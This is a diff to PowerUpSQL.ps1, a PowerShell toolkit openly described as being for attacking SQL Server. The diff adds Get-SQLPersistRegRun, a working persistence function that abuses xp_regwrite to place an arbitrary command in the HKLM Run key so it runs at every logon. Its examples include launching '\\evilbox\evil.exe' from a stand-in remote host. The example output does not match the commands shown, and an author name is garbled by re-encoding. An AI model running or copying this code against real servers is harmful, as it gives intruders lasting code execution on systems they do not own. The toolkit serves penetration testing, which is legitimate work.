@@ -4,7 +4,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.31
+        Version: 1.0.0.32
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -9463,8 +9463,7 @@ Function   Get-SQLRecoverPwAutoLogon
     <#
             .SYNOPSIS
             Returns the Windows auto login credentials through SQL Server using xp_regread. 
-            This will work with the Public role prior to SQL Server 2014.  
-            SQL Server 2014 and later will require sysadmin privileges.
+            This requires sysadmin privileges.
             .PARAMETER Username
             SQL Server or domain account to authenticate with.
             .PARAMETER Password
@@ -9710,7 +9709,193 @@ Function   Get-SQLRecoverPwAutoLogon
 #region          PERSISTENCE FUNCTIONS
 #
 #########################################################################
-#
+
+# ----------------------------------
+#  Get-SQLPersistRegRun  
+# ----------------------------------
+# Author: Scott Sutherland
+Function   Get-SQLPersistRegRun
+{
+    <#
+            .SYNOPSIS
+            This function will use the xp_regwrite procedure to setup an 
+            executable to automatically run when users log in.  The specific registry key is.
+            HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run  
+            Sysadmin privileges are required.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER Name
+            Registry value name.
+            .PARAMETER Command
+            Command to run.
+
+            .Example
+            PS C:\> Get-SQLPersistRegRun -Verbose -Name PureEvil -Command 'PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"' -Instance "SQLServer1\STANDARDDEV2014"
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write value: yeah
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: dothis.exe
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Done.
+
+            .Example
+            PS C:\> Get-SQLPersistRegRun -Verbose -Name PureEvil -Command "\\evilbox\evil.exe" -Instance "SQLServer1\STANDARDDEV2014"
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write value: yeah
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: dothis.exe
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Done.
+
+            .Notes
+            https://support.microsoft.com/en-us/kb/887165
+            https://msdn.microsoft.com/en-us/library/aa940179(v=winembedded.5).aspx
+            http://sqlmag.com/t-sql/using-t-sql-manipulate-registry
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Name of the registry value.')]
+        [string]$Name = "Hacker",
+
+        [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'The command to run.')]
+        [string]$Command = 'PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"',
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+    }
+
+    Process
+    {
+        # Parse computer name from the instance
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+            }
+        }
+        else
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+            return
+        }       
+
+        # Get sysadmin status
+        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
+
+        # Get SQL Server version number
+        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
+        if($SQLVersionFull)
+        {
+            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
+        }
+
+        # Check if this can actually run with the current login
+        if($IsSysadmin -ne "Yes")
+        {          
+            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
+            Return
+        }else{
+
+            Write-Verbose "$Instance : Attempting to write value: $name"
+            Write-Verbose "$Instance : Attempting to write command: $command"
+        }
+
+        # Setup query for registry update
+        $Query = "
+       ---------------------------------------------
+        -- Use xp_regwrite to configure 
+        -- a file to execute sa command when users l
+        -- log into the system
+        ----------------------------------------------
+        EXEC master..xp_regwrite
+        @rootkey     = 'HKEY_LOCAL_MACHINE',
+        @key         = 'Software\Microsoft\Windows\CurrentVersion\Run',
+        @value_name  = '$Name',
+        @type        = 'REG_SZ',
+        @value       = '$Command'"
+
+        # Execute query
+        $Results = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+        
+        # Setup query to verify the write is successful
+        $CheckQuery = "
+        -------------------------------------------------------------------------
+        -- Get Windows Auto Login Credentials from the Registry
+        -------------------------------------------------------------------------
+        -- Get AutoLogin Default Domain
+        DECLARE @CheckValue  SYSNAME
+        EXECUTE master.dbo.xp_regread
+        @rootkey		= N'HKEY_LOCAL_MACHINE',
+        @key			= N'Software\Microsoft\Windows\CurrentVersion\Run',
+        @value_name		= N'$Name',
+        @value			= @CheckValue output
+        
+        -- Display Results
+        SELECT CheckValue = @CheckValue"
+
+        # Execute query
+        $CheckResults = Get-SQLQuery -Instance $Instance -Query $CheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
+        $CheckCommand = $CheckResults.CheckValue   
+        if($CheckCommand.length -ge 2){
+            Write-Verbose "$Instance : Registry entry written."                   
+        }else{
+            Write-Verbose "$Instance : Fail to write to registry due to insufficient privileges."
+        } 
+    }
+
+    End
+    {
+        # Return message
+        Write-Verbose "$Instance : Done."
+    }
+}
 #endregion
 
 #########################################################################
@@ -12976,7 +13161,7 @@ Function Invoke-SQLAuditSampleDataByColumn
 # -------------------------------------------
 # Function: Test-IsLuhnValid
 # -------------------------------------------
-# Author: Ã˜YVIND KALLSTAD
+# Author: ÃƒËœYVIND KALLSTAD
 # Source: https://communary.net/2016/02/19/the-luhn-algorithm/
 function Test-IsLuhnValid
 {
@@ -12994,7 +13179,7 @@ function Test-IsLuhnValid
             .OUTPUTS
             System.Boolean
             .NOTES
-            Author: Ã˜YVIND KALLSTAD
+            Author: ÃƒËœYVIND KALLSTAD
             Date: 19.02.2016
             Version: 1.0
             Dependencies: Get-LuhnCheckSum, ConvertTo-Digits
@@ -13029,7 +13214,7 @@ function Test-IsLuhnValid
 # -------------------------------------------
 # Function: ConvertTo-Digits
 # -------------------------------------------
-# Author: Ã˜YVIND KALLSTAD
+# Author: ÃƒËœYVIND KALLSTAD
 # Source: https://communary.net/2016/02/19/the-luhn-algorithm/
 function ConvertTo-Digits
 {
@@ -13046,7 +13231,7 @@ function ConvertTo-Digits
             https://communary.wordpress.com/
             https://github.com/gravejester/Communary.ToolBox
             .NOTES
-            Author: Ã˜YVIND KALLSTAD
+            Author: ÃƒËœYVIND KALLSTAD
             Date: 09.05.2015
             Version: 1.0
     #>
